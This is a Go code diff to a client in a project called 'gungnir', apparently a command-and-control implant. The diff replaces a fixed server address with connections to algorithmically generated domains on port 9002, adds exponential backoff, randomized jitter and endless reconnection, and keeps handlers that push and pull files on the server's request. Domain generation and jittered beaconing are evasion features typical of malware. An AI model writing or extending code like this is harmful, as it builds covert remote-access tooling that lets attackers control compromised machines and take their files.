@@ -7,6 +7,7 @@ import (
     "fmt"
     "io"
     "log"
+    "math/rand"
     "net"
     "os"
     "os/exec"
@@ -14,9 +15,13 @@ import (
     "runtime"
     "strings"
     "sync"
+    "time"
     
     p "gungnir/internal/proto"
+    u "gungnir/internal/utils"
 )
+
+const letters = "abcdefghijklmnopqrstuvwxyz"
 
 type Client struct {
     id   string
@@ -27,7 +32,6 @@ type Client struct {
 }
 
 func main() {
-    server := flag.String("server", "127.0.0.1:9000", "server tcp address host:port")
     id := flag.String("id", "", "client id, default hostname")
     flag.Parse()
 
@@ -35,14 +39,66 @@ func main() {
         *id = hostnameFallback()
     }
 
-    conn, err := net.Dial("tcp", *server)
-    if err != nil {
-        log.Fatalf("connect failed: %v", err)
-    }
-    defer conn.Close()
+    // jitter seed
+    rand.Seed(time.Now().UnixNano())
 
+    for {
+        conn, picked := dialWithBackoff(9002)
+        log.Printf("connected to %s", picked)
+
+        if err := runSession(*id, conn); err != nil {
+            log.Printf("session ended with error: %v", err)
+        } else {
+            log.Printf("session ended")
+        }
+
+        _ = conn.Close()
+        // short wait before attempting to reconnect to avoid a loop
+        sleepWithJitter(2*time.Second, 500*time.Millisecond)
+    }
+}
+
+func dialWithBackoff(port int) (net.Conn, string) {
+    attempt := 0
+    backoff := 1 * time.Second
+    maxBackoff := 30 * time.Second
+
+    for {
+        for addr := range u.GenDomainsStream(23, 16, port) {
+            attempt++
+
+            conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+            if err == nil {
+                return conn, addr
+            }
+
+            log.Printf("dial attempt #%d to %s failed: %v", attempt, addr, err)
+            // wait with jitter
+            sleepWithJitter(backoff, backoff*2)
+        }
+
+        // exponential with ceiling
+        backoff *= 2
+        if backoff > maxBackoff {
+            backoff = maxBackoff
+        }
+    }
+}
+
+func sleepWithJitter(base time.Duration, jitter time.Duration) {
+    if jitter <= 0 {
+        time.Sleep(base)
+        return
+    }
+
+    // uniforme jitter [0, jitter)
+    extra := time.Duration(rand.Int63n(int64(jitter)))
+    time.Sleep(base + extra)
+}
+
+func runSession(id string, conn net.Conn) error {
     c := &Client{
-        id:   *id,
+        id:   id,
         conn: conn,
         r:    bufio.NewReader(conn),
         send: make(chan *p.Message, 32),
@@ -62,10 +118,10 @@ func main() {
 
     // register
     if err := p.WriteJSON(conn, &p.Message{Type: "register", ClientID: c.id}); err != nil {
-        log.Fatalf("register failed: %v", err)
+        return fmt.Errorf("register failed: %w", err)
     }
 
-    log.Printf("connected as %s to %s", c.id, *server)
+    log.Printf("registered as %s", c.id)
 
     // reader loop
     for {
@@ -76,7 +132,7 @@ func main() {
                 break
             }
 
-            log.Fatalf("read error: %v", err)
+            return fmt.Errorf("read error: %w", err)
         }
         switch msg.Type {
         case "file":
@@ -92,6 +148,7 @@ func main() {
 
     close(c.send)
     c.wg.Wait()
+    return nil
 }
 
 func (c *Client) handleFile(msg *p.Message) {
@@ -129,7 +186,7 @@ func (c *Client) handlePullFile(msg *p.Message) {
 
     c.send <- &p.Message{
         ID:       msg.ID,
-        Type:     "file",     // pull_file response
+        Type:     "file", // pull_file response
         FilePath: msg.FilePath,
         Data:     data,
         Checksum: sum,
